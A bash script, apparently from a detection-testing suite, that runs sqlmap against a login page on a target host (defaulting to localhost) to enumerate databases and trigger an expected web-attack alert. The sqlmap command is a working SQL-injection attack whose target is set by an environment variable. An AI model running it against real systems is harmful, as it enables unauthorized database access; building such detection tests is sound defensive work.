#!/bin/bash
# 03_sqli.sh — automated SQL injection probing with sqlmap.
# Expected detection: SX-WEB-ATTACK (T1190, high).
#
# NOTE: requires sqlmap to be installed (https://sqlmap.org/). If it is not
# installed this script exits with a clear message instead of failing.
#
# Usage: TARGET=target ./03_sqli.sh
set -euo pipefail

TARGET="${TARGET:-127.0.0.1}"

if ! command -v sqlmap >/dev/null 2>&1; then
    echo "[03] ERROR: sqlmap is not installed — skipping SQLi step."
    echo "[03] Install it from https://sqlmap.org/ and re-run this script."
    exit 1
fi

echo "=== [03] SQLi: sqlmap probing http://${TARGET}:5000/login ==="
sqlmap -u "http://${TARGET}:5000/login" \
    --data="user=admin&pass=x" \
    --batch --dbs --level=2 --risk=1 \
    || echo "[03] sqlmap finished (non-zero exit is normal on clean failures)"

echo "=== [03] done ==="
